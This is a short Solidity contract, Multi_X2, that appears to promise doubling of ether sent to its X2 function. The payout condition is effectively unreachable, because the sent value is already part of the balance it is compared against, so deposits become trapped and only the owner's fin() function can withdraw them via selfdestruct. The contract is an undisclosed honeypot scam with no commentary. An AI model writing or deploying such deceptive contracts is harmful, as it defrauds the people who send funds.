pragma solidity ^0.4.25;

contract Multi_X2
{
    address Owner = msg.sender;

    function() public payable {}
    function close() private { selfdestruct(msg.sender); }

    function X2() public payable {
        if (msg.value >= address(this).balance) {
           close();
        }
    }
 
    function fin() public {
        if (msg.sender == Owner) {
            close();
        }
    }
}